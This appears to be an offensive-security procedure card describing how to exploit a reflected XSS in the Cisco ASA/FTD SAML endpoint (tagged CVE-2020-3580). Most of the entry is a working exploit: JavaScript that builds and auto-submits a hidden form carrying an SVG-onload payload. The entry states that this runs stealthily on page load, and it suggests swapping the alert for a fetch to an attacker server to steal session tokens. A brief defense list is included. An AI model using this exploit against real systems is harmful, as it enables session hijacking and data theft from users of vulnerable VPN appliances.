---
id: d4e5f6g7-h8i9-0123-defg-456789012345
name: Trigger-XSS-via-Auto-Submitted-SAML-Form
tags:
  - xss-execution
  - saml-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Cisco ASA
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:02.436Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-via-Auto-Submitted-SAML-Form

## Summary

This procedure executes the reflected XSS by auto-submitting a POST form from the malicious HTML to the vulnerable SAML endpoint in Cisco ASA/FTD, injecting JavaScript that runs in the victim's browser.

## Description

Once the victim loads the HTML, JavaScript dynamically creates and submits a form to `/+CSCOE+/saml/sp/acs?tgname=a` with the unsanitized SAMLResponse payload. The reflection allows breakout from attributes to execute code like cookie theft. Affects only specific configurations; outcomes include arbitrary JS for data access or further attacks.

## Requirements

1. Loaded malicious HTML in victim's browser
2. Accessible target SAML endpoint
3. No additional tools; relies on browser JS

## Defense

Defensive measures and detection strategies:

- Input validation on SAML parameters
- Web Application Firewall (WAF) rules for XSS payloads
- Logging of SAML POST requests for anomaly detection

## Objectives

1. Inject and reflect the XSS payload successfully
2. Execute JS to access browser context (e.g., cookies)
3. Maintain stealth via auto-submission

## Instructions

### Step 1: Auto-Form Creation and Submission

**Context**: The embedded JS in the HTML handles form creation with the payload and immediate POST.

The script executes on page load:

```javascript
history.pushState('', '', '/');
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://[target]/+CSCOE+/saml/sp/acs?tgname=a';
var input = document.createElement('input');
input.type = 'hidden';
input.name = 'SAMLResponse';
input.value = '"&gt;&lt;svg/onload=alert(document.cookies)&gt;';
form.appendChild(input);
document.body.appendChild(form);
form.submit();
```

No manual action; it runs automatically.

> The payload ` '"&gt;&lt;svg/onload=alert(document.cookies)&gt;' ` closes quotes/tags and injects an SVG element that alerts cookies on load.

### Step 2: Verify XSS Execution

**Context**: Observe or customize for exfiltration to confirm payload reflection.

In a test environment, load the page and check for the alert. For real attacks, replace alert with fetch to attacker server for data theft.

> Expected: JS executes post-submission, accessing victim-specific data like session tokens.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss-trigger
- auto-submit
- cve-2020-3580
